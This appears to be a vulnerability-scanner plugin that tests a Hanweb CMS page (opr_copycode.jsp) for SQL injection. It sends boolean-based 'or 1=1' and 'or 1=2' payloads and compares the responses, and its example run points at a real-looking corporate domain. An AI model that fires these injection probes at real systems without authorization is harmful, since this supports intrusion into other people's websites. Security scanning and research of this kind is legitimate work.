#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0143776

import re

def assign(service, arg): 
    if service == "hanweb":
        return True, arg
		
def audit(arg):
    payload = 'vc/vc/style/opr_copycode.jsp?id=-1'
    getdata1 = '%20or%201%3D1'
    getdata2 = '%20or%201%3D2'
    code1, head,res1, errcode, _ = curl.curl2(arg+ payload +getdata1)
    code2, head,res2, errcode, _ = curl.curl2(arg+ payload +getdata2)
    m1 = re.findall('td',res1)
    m2 = re.findall('td',res2)
    if code1 == 200 and code2 == 500 and m1!=m2:
        security_hole(arg+payload + "   :sql Injection")




if __name__ == '__main__': 
    from dummy import *
    audit(assign('hanweb', 'http://6bur.cscec.com/')[1])